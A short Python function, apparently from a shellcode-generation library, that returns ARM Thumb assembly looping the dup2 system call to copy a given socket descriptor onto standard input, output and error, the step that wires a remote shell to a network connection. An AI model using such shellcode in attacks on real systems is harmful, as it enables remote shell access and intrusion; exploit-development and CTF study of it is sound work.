# dup(sock)
def ARM_THUMB_DUP(sock=4):
    sc = """
    movs r1, #3
    movs r7, #(0+ 63)
    sub r2, r2, r2
    movs r5, #%s
loop_2:
    mov  r0, r5
    sub  r1, r1, #1
    svc  1
    cmp  r1, r2
    bne  loop_2
    """ % (sock)
    return sc
